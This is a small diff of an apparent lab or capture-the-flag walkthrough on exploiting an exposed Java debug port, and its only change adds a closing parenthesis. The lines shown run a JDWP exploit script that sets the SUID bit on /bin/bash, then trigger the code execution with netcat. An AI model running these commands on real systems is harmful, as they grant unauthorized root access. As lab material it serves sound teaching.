@@ -16,6 +16,6 @@
 
 #### 5) python2 jdwp-shellifier.py -t 127.0.0.1 -p 8888 --cmd 'chmod u+s /bin/bash' (Run the exploit)
 
-#### 6) Target session: nc localhost 8005 (Trigger a connection on target ssh session AFTER you run the exploit to trigger the RCE
+#### 6) Target session: nc localhost 8005 (Trigger a connection on target ssh session AFTER you run the exploit to trigger the RCE)
 
 #### 7) PWNED!
